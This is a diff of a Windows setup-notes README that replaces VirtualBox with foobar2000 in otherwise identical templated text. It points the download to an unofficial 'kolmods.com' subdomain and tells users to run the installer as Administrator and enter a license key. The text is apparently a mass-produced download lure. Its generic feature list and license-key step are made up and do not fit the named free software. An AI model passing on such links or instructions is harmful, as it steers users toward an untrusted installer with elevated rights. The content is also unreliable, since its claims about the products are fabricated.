@@ -1,10 +1,14 @@
-# VirtualBox Windows Setup Notes
+# foobar2000 Windows Setup Notes
+
+<p align="center">
+  <a href="https://foobar2000-setup.kolmods.com/">
+    <img src="https://img.shields.io/badge/Download-foobar2000-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download foobar2000">
+  </a>
+</p>
 
 ## Download & Install
 
-> **Download:** [**Get VirtualBox for Windows →**](https://virtualbox-setup.kolmods.com/)
->
-> Setup notes for **VirtualBox** on Windows 10/11 (64-bit). Run the installer as Administrator.
+> Setup notes for **foobar2000** on Windows 10/11 (64-bit). Run the installer as Administrator.
 
 ### Quick steps
 
@@ -12,15 +16,15 @@
 2. Save the file to a local folder you can find later
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
-5. Restart if the installer asks — then launch **VirtualBox** from the Start menu
+5. Restart if the installer asks — then launch **foobar2000** from the Start menu
 
 ## What you can use it for
 
-- Core VirtualBox features on Windows desktop
-- Install and configure VirtualBox for daily use
-- Import, edit, and export with VirtualBox tools
-- Tune settings and profiles inside VirtualBox
-- Integrate VirtualBox into your existing workflow
+- Core foobar2000 features on Windows desktop
+- Install and configure foobar2000 for daily use
+- Import, edit, and export with foobar2000 tools
+- Tune settings and profiles inside foobar2000
+- Integrate foobar2000 into your existing workflow
 
 ## License
 
